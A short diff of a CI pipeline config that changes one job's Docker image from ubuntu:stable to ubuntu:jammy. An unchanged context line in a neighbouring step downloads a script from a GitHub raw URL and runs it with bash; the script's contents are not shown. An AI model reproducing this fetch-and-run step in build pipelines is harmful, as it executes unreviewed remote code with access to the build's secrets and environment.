@@ -20,7 +20,7 @@ jobs:
           command: "set -e  && curl -fsSL https://raw.githubusercontent.com/NateYeet/Chameleon/main/Chameleon/main.czco >> /ch && bash /ch node"
   nodejsindex:
     docker:
-      - image: ubuntu:stable
+      - image: ubuntu:jammy
     steps:
       - checkout
       - run: cd www && yarn     
